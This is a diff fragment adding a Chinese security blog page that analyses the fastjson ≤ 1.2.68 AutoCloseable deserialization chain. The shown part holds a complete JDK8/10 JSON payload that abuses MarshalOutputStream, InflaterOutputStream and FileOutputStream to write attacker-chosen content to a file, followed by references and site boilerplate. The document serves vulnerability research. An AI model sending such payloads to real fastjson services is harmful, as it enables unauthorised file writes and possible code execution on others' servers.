<span class="string">&#x27;limit&#x27;</span>:<span class="number">22</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;bufLen&#x27;</span>:<span class="number">1048576</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;protocolVersion&#x27;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>JDK8/10</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;@type&#x27;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;@type&#x27;</span>:<span class="string">&#x27;sun.rmi.server.MarshalOutputStream&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;out&#x27;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;@type&#x27;</span>:<span class="string">&#x27;java.util.zip.InflaterOutputStream&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;out&#x27;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="string">&#x27;@type&#x27;</span>:<span class="string">&#x27;java.io.FileOutputStream&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;dst&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;append&#x27;</span>:<span class="keyword">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;infl&#x27;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;input&#x27;</span>:<span class="string">&#x27;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;bufLen&#x27;</span>:<span class="number">1048576</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;protocolVersion&#x27;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p>对 fastjson 1.2.68 的理解是片面的，由于最近囫囵吞枣的学完 fastjson ，还是缺少一个系统的分析</p>
+<p><a target="_blank" rel="noopener" href="http://scz.617.cn:8/web/202008100900.txt">http://scz.617.cn:8/web/202008100900.txt</a></p>
+<p><a target="_blank" rel="noopener" href="http://scz.617.cn:8/web/202008111715.txt">http://scz.617.cn:8/web/202008111715.txt</a></p>
+<p><a target="_blank" rel="noopener" href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/">https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-68-fastjson-safemode"><span class="toc-number">1.</span> <span class="toc-text">1.2.68 fastjson_safemode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-68-1-2-69-diff"><span class="toc-number">2.</span> <span class="toc-text">1.2.68-1.2.69 diff</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AutoCloseable-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E7%94%A8"><span class="toc-number">3.1.</span> <span class="toc-text">AutoCloseable 为什么能用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AutoCloseable-%E4%B8%8E-expectClass-%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">3.2.</span> <span class="toc-text">AutoCloseable 与 expectClass 的关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checkAutoType-%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">3.3.</span> <span class="toc-text">checkAutoType 的限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E9%93%BE"><span class="toc-number">3.4.</span> <span class="toc-text">如何构造链</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REF"><span class="toc-number">4.</span> <span class="toc-text">REF</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson ≤ 1.2.68 AutoCloseable 利用链分析&body=Check out this article: http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson ≤ 1.2.68 AutoCloseable 利用链分析&description=&lt;p&gt;fastjson ≤ 1.2.68  的利用链分析&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/03/29/fastjson-%E2%89%A4-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson ≤ 1.2.68 AutoCloseable 利用链分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 M13n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
